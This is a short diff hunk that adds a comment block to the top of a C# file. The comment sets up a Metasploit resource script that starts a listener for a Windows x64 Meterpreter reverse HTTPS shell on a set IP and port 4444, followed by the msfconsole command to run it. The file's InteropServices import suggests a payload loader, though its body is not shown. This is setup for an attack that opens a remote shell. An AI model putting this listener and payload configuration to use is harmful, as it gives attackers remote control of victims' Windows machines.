@@ -1,3 +1,14 @@
+/*
+> cat mrshell_x64.rc
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.100.12
+set LPORT 4444
+set EXITFUNC thread
+set EXITONSESSION false
+> msfconsole -r mrshell_x64.rc
+*/
+
 using System;
 using System.Runtime.InteropServices;
 
